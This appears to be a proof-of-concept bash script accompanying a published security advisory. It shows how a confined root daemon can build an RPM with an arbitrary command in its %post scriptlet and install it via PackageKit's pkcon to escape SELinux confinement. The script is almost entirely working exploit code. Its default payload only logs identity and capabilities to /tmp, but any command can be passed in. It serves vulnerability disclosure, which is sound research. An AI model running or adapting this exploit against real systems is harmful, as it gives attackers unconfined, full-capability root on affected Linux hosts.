#!/bin/bash
#
# LinnemanLabs - PackageKit %post PoC
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://github.com/linnemanlabs/advisories/
#
# a confined uid-0 daemon can install a crafted rpm through PackageKit.
# %post command runs as rpm_script_t - unconfined_domain_type, full-cap root
#
# gate: the untrusted-install auth_admin action, self-passed by uid-0
# reach: any uid-0 daemon that can send to the PackageKit D-Bus name
#
# rpmbuild is bin_t, can also build the crafted rpm off-box and transfer to
# target. the pkcon portion is what you run on the target
#
CMD="${1:-id > /tmp/rpm.out; grep ^Cap /proc/self/status >> /tmp/rpm.out}"
RPM="/run/linnemanlabs-pkpoc.rpm"

set -eu
# build a minimal rpm carrying our payload in %post (needs rpmbuild on the builder)
BT="$( mktemp -d )"
cat > "${BT}/poc.spec" <<EOF
Name: linnemanlabs-pkpoc
Version: 1
Release: 1
Summary: poc
License: none
%description
poc
%post
${CMD}
%files
EOF
echo "[*] building rpm"
rpmbuild --define "_topdir ${BT}" --define "_rpmdir ${BT}" -bb "${BT}/poc.spec" >/dev/null 2>&1
echo "[*] staging rpm at ${RPM}"
cp "$( find "${BT}" -name '*.rpm' | head -1 )" "${RPM}" 2>&1
rm -rf "${BT}"

# install it - pkcon drives the two D-Bus calls (CreateTransaction + InstallFiles)
# raw D-Bus equivalent: CreateTransaction -> InstallFiles tas 0 1 <rpm> on the transaction object
echo "[*] installing rpm from ${RPM}"
pkcon install-local --allow-untrusted -y "${RPM}" || { echo "[-] Failed to run pkcon. Try the direct dbus calls"; exit 1; }
echo "[+] installed - CMD should have run. check /tmp/rpm.out if using default CMD"
echo "[*] clean up: sudo dnf -y remove linnemanlabs-pkpoc"

exit 0
